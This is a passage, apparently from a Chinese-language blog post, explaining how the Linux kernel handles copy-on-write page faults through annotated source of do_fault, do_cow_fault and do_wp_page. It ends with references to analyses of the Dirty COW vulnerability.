- 若是写操作，判断页面是否是可共享的页面，如果不是说明页面是 Task 私有的，需要 COW，调用`do_cow_dault`
- 若是写操作，且页面是共享的，调用`do_shared_fault`

```c
static int do_fault(struct mm_struct *mm, struct vm_area_struct *vma,
		unsigned long address, pte_t *page_table, pmd_t *pmd,
		unsigned int flags, pte_t orig_pte)
{
	pgoff_t pgoff = (((address & PAGE_MASK)
			- vma->vm_start) >> PAGE_SHIFT) + vma->vm_pgoff;	// 发生page fault的地址在文件中的页面偏移量

	pte_unmap(page_table);
	/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */
	if (!vma->vm_ops->fault)	// 是否有定义处理缺页异常的函数
		return VM_FAULT_SIGBUS;
	if (!(flags & FAULT_FLAG_WRITE))	// 当前内存访问是读操作
		return do_read_fault(mm, vma, address, pmd, pgoff, flags,
				orig_pte);
	if (!(vma->vm_flags & VM_SHARED))	// 当前内存访问是写操作，且是私有映射MAP_PRIVATE，那么需要COW
		return do_cow_fault(mm, vma, address, pmd, pgoff, flags,	// 创建一个新的页，将数据拷贝到新页中，设置新页的PTE（此时还未真正write）
				orig_pte);
	return do_shared_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);	// 当前内存访问是写操作，且是共享映射MAP_SHARED，不需要COW
}
```

##### do_cow_fault

`do_cow_fault`的流程大致如下

- 首先调用`alloc_page_vma`分配一个新的物理页面`new_page`
- 检查是否 OOM
- 然后`__do_fault`从文件中读取数据到另一个页面`fault_page`，其本质上是调用`vma->vm_ops`上绑定的`fault`函数
- `copy_user_highpage`将`fault_page`的数据拷贝到`new_page`中，这个函数实际上是`memcpy`的 wrap
- `do_set_pte`为页面设置 pte，属性为可写、匿名页

```c
static int do_cow_fault(struct mm_struct *mm, struct vm_area_struct *vma,
		unsigned long address, pmd_t *pmd,
		pgoff_t pgoff, unsigned int flags, pte_t orig_pte)
{
	struct page *fault_page, *new_page;
	struct mem_cgroup *memcg;
	spinlock_t *ptl;
	pte_t *pte;
	int ret;

	if (unlikely(anon_vma_prepare(vma)))
		return VM_FAULT_OOM;

	new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);	// 为新页分配物理内存。VMA的表示粒度是4k
	if (!new_page)
		return VM_FAULT_OOM;

	if (mem_cgroup_try_charge(new_page, mm, GFP_KERNEL, &memcg)) {	// 检查当前进程使用的内存是否超过了cgroup的限制
		page_cache_release(new_page);	// 释放COW的新页
		return VM_FAULT_OOM;	// 返回OOM错误，COW失败
	}

	ret = __do_fault(vma, address, pgoff, flags, new_page, &fault_page);	// 从文件中读取数据到fault_page
	if (unlikely(ret & (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))
		goto uncharge_out;

	if (fault_page)	// 读取成功
		copy_user_highpage(new_page, fault_page, address, vma);	// 将fault_page的数据拷贝到new_page中，实际调用memcpy
	__SetPageUptodate(new_page);

	pte = pte_offset_map_lock(mm, pmd, address, &ptl);
	if (unlikely(!pte_same(*pte, orig_pte))) {	// 并发检查
		pte_unmap_unlock(pte, ptl);
		if (fault_page) {
			unlock_page(fault_page);
			page_cache_release(fault_page);
		} else {
			/*
			 * The fault handler has no page to lock, so it holds
			 * i_mmap_lock for read to protect against truncate.
			 */
			i_mmap_unlock_read(vma->vm_file->f_mapping);
		}
		goto uncharge_out;
	}
	do_set_pte(vma, address, new_page, pte, true, true);	// 设置新页的PTE，该页为可写匿名页
	mem_cgroup_commit_charge(new_page, memcg, false);
	lru_cache_add_active_or_unevictable(new_page, vma);
	pte_unmap_unlock(pte, ptl);
	if (fault_page) {
		unlock_page(fault_page);
		page_cache_release(fault_page);
	} else {
		/*
		 * The fault handler has no page to lock, so it holds
		 * i_mmap_lock for read to protect against truncate.
		 */
		i_mmap_unlock_read(vma->vm_file->f_mapping);
	}
	return ret;
uncharge_out:
	mem_cgroup_cancel_charge(new_page, memcg);
	page_cache_release(new_page);
	return ret;
}
```

##### do_wp_page

第一次缺页时我们已经靠`do_fault`里的`do_cow_fault`把文件内容读进内存并设好了 pte，现在是由于没有写权限导致的第二次缺页，这次在`handle_pte_fault`调用的`do_wp_page`流程如下

- 首先获取 pte 对应的页面
- 然后 COW 的流程会走到`reuse_swap_page`，判断是否只有一个 Task 在使用该页面
- 如果是就直接复用`do_cow_fault`分配的新页面，`wp_page_copy`拷贝页面内容，至此完成 COW

```c
static int do_wp_page(struct mm_struct *mm, struct vm_area_struct *vma,
		unsigned long address, pte_t *page_table, pmd_t *pmd,
		spinlock_t *ptl, pte_t orig_pte)
	__releases(ptl)
{
	struct page *old_page;

	old_page = vm_normal_page(vma, address, orig_pte);	// 获取pte对应的页面
	if (!old_page) {
		/*
		 * VM_MIXEDMAP !pfn_valid() case, or VM_SOFTDIRTY clear on a
		 * VM_PFNMAP VMA.
		 *
		 * We should not cow pages in a shared writeable mapping.
		 * Just mark the pages writable and/or call ops->pfn_mkwrite.
		 */
		if ((vma->vm_flags & (VM_WRITE|VM_SHARED)) ==
				     (VM_WRITE|VM_SHARED))
			return wp_pfn_shared(mm, vma, address, page_table, ptl,
					     orig_pte, pmd);

		pte_unmap_unlock(page_table, ptl);
		return wp_page_copy(mm, vma, address, page_table, pmd,
				    orig_pte, old_page);
	}

	/*
	 * Take out anonymous pages first, anonymous shared vmas are
	 * not dirty accountable.
	 */
	if (PageAnon(old_page) && !PageKsm(old_page)) {		// 处理匿名页
		if (!trylock_page(old_page)) {	// 尝试获取页面锁
			page_cache_get(old_page);
			pte_unmap_unlock(page_table, ptl);
			lock_page(old_page);
			page_table = pte_offset_map_lock(mm, pmd, address,
							 &ptl);
			if (!pte_same(*page_table, orig_pte)) {
				unlock_page(old_page);
				pte_unmap_unlock(page_table, ptl);
				page_cache_release(old_page);
				return 0;
			}
			page_cache_release(old_page);
		}
		if (reuse_swap_page(old_page)) {	// 判断是否只有一个进程引用该页面，如果是则直接复用
			/*
			 * The page is all ours.  Move it to our anon_vma so
			 * the rmap code will not search our parent or siblings.
			 * Protected against the rmap code by the page lock.
			 */
			page_move_anon_rmap(old_page, vma, address);	// 移动页面到匿名映射区
			unlock_page(old_page);
			return wp_page_reuse(mm, vma, address, page_table, ptl,	// 重用页面
					     orig_pte, old_page, 0, 0);
		}
		unlock_page(old_page);
	} else if (unlikely((vma->vm_flags & (VM_WRITE|VM_SHARED)) ==
					(VM_WRITE|VM_SHARED))) {
		return wp_page_shared(mm, vma, address, page_table, pmd,
				      ptl, orig_pte, old_page);
	}

	/*
	 * Ok, we need to copy. Oh, well..
	 */
	page_cache_get(old_page);

	pte_unmap_unlock(page_table, ptl);
	return wp_page_copy(mm, vma, address, page_table, pmd,
			    orig_pte, old_page);
}
```

## Reference

- [一文聊透 Linux 缺页异常的处理 —— 图解 Page Faults](https://www.cnblogs.com/binlovetech/p/17918733.html)
- [从内核世界透视 mmap 内存映射的本质（源码实现篇）](https://www.cnblogs.com/binlovetech/p/17754173.html)
- [CVE-2016-5195漏洞分析与复现](https://xz.aliyun.com/t/7561?time__1311=n4%2BxnD0G0%3D14gDBqPod4iIQ0I%3DD5G80ePD&alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-7)
- [【漏洞分析】CVE-2016-5195 Dirtycow: Linux内核提权漏洞分析](https://www.anquanke.com/post/id/84784)
- [Linux 缺页异常处理流程分析与CVE-2021-5195分析](https://www.anquanke.com/post/id/290851)
- [Linux高危漏洞Dirtycow整理](https://zhuanlan.zhihu.com/p/25918300)
- [奔跑吧Linux内核](https://xuanxuanblingbling.github.io/assets/attachment/奔跑吧-linux内核-内存管理-DirtyCow.pdf)
